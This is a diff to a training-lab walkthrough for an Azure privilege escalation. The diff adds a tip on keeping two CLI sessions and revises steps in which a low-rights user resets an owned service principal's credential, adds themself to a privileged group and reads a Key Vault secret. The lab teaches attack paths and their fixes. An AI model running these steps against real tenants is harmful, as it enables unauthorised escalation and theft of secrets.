@@ -39,6 +39,22 @@ norightsuser is now in the admin group
 group grants Key Vault Secrets User  -->  read 'flag' secret from the vault
 ```
 
+> **Tip — keep two sessions side by side.** This lab alternates between two
+> identities: your **user** (`norightsuser`) and the **service principal**.
+> Instead of `az logout` / `az login` every time, give each its own Azure CLI
+> session with `AZURE_CONFIG_DIR`, in two terminals — then switch identity just by
+> switching terminal:
+>
+> ```bash
+> # Shell A — your user (Steps 1-3, 6, 7)
+> export AZURE_CONFIG_DIR=~/.azure-user
+> az login --username <norightsuser-upn> --password '<password>' --allow-no-subscriptions
+>
+> # Shell B — the service principal (Steps 4-6; create its credential in Step 3 first)
+> export AZURE_CONFIG_DIR=~/.azure-sp
+> az login --service-principal --username <appId> --password '<password>' --tenant <tenant> --allow-no-subscriptions
+> ```
+
 ### Step 1 — Find the service principal you own
 
 You were removed from the app registration's owners, but you're still an owner of
@@ -72,7 +88,8 @@ az ad sp credential reset --id <sp-object-id> --append
 
 ### Step 4 — Authenticate as the service principal
 
-The service principal has no role on any subscription, so pass
+In a second terminal (Shell B), log in as the service principal with the
+credential from Step 3. It has no role on any subscription, so pass
 `--allow-no-subscriptions` — this attack is entirely directory-scoped (Microsoft
 Graph) and needs no subscription.
 
@@ -99,14 +116,14 @@ the group's `id` from the output for the next step.
 
 ### Step 6 — Add yourself to the group
 
-Find your object id by UPN (from a session signed in as yourself):
+In your **user** session (Shell A), get your own object id:
 
 ```bash
-az ad user show --id <norightsuser-upn> --query id -o tsv
+az ad signed-in-user show --query id -o tsv
 ```
 
-Then, acting as the service principal (which has `Group.ReadWrite.All`), add that
-object id to the group:
+Then in the **service principal** session (Shell B, which has
+`Group.ReadWrite.All`), add that object id to the group:
 
 ```bash
 az ad group member add \
@@ -117,16 +134,17 @@ az ad group member add \
 ### Step 7 — Read the flag from the Key Vault
 
 Group membership grants the group the **Key Vault Secrets User** role on the lab's
-vault. Sign back in as your own user (so your token carries the new group claim),
-then read the secret:
+vault. Back in your **user** session (Shell A), sign in again so your token picks
+up the new group claim, then read the secret:
 
 ```bash
-az login --username <norightsuser-upn> --password <password> --allow-no-subscriptions
+az login --username <norightsuser-upn> --password '<password>' --allow-no-subscriptions
 az keyvault secret show --vault-name <vault> --name flag --query value -o tsv
 ```
 
 > Group membership can take a few minutes to propagate, and RBAC role claims are
-> only refreshed on a new sign-in — sign out/in if the read is denied at first.
+> only refreshed on a new sign-in — sign out/in (in Shell A) if the read is
+> denied at first.
 
 ## How to Fix in Production
 
